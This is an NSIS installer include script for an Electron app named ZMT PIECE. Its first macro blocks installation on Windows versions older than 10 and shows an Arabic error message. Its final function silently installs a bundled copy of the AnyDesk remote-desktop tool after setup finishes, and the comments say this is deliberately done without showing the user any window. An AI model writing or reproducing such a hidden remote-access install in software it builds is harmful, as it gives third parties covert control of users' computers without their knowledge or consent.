; ==========================================================================
; ZMT PIECE — main build (Windows 10 and newer).
; package.json -> build.nsis.include = "build/installer.nsh"
;
; IMPORTANT: electron-builder prepends this file to the generated script, so
; it is parsed BEFORE common.nsh / MUI2 / LogicLib exist. Therefore:
;   - only raw NSIS instructions here (no LogicLib ${If}, no WinVer);
;   - define macros only (!macro customInit ...), never a second
;     "Function .onInit" (the template already defines one).
; The uninstaller build never inserts customInit (BUILD_UNINSTALLER), so
; "Uninstall ZMT PIECE.exe" keeps working on every system.
; ==========================================================================

; 1) Refuse to install THIS build on Windows 8.1 / 8 / 7.
;    CurrentBuild < 10240 = anything older than Windows 10 (8.1 = 9600).
;    Read WITHOUT SetRegView: "Microsoft\Windows NT\CurrentVersion" is a
;    shared key, so the 32-bit installer reads the true value on x64 too.
;    An empty value (unknown system) is allowed - never block out of doubt.
!macro customInit
  ReadRegDWORD $R9 HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion" "CurrentBuild"
  StrCmp $R9 "" __zmt_win_ok
  IntCmp $R9 10239 __zmt_win_low __zmt_win_low __zmt_win_ok

__zmt_win_low:
  ; interactive: show WHY before stopping (no silent-mode hang possible)
  IfSilent __zmt_win_done 0
  MessageBox MB_OK|MB_ICONSTOP "ZMT PIECE مصمم للعمل على ويندوز 10 أو أحدث.$\n$\nهذا الجهاز يعمل بنظام أقدم من ويندوز 10.$\n$\nاستخدم نسخة التثبيت المخصصة لأنظمة ويندوز 7/8 — الملف الذي ينتهي بـ win7.exe$\n$\nسيتم إيقاف التثبيت الآن."

__zmt_win_done:
  ; both modes: stop with a non-zero exit code so scripts/verify-installers.js
  ; cannot mistake a blocked install for a successful one.
  SetErrorLevel 2
  Quit

__zmt_win_ok:
!macroend

; 2) Silent-install AnyDesk bundled with ZMT PIECE.
;    Runs after the main installation completes; --install --silent ensures
;    no setup window is shown to the user. AnyDesk self-installs to
;    %LOCALAPPDATA%\AnyDesk (the same path the app's support button checks).
Function .onInstSuccess
  ExecWait '"$INSTDIR\resources\AnyDesk.exe" --install --silent'
FunctionEnd
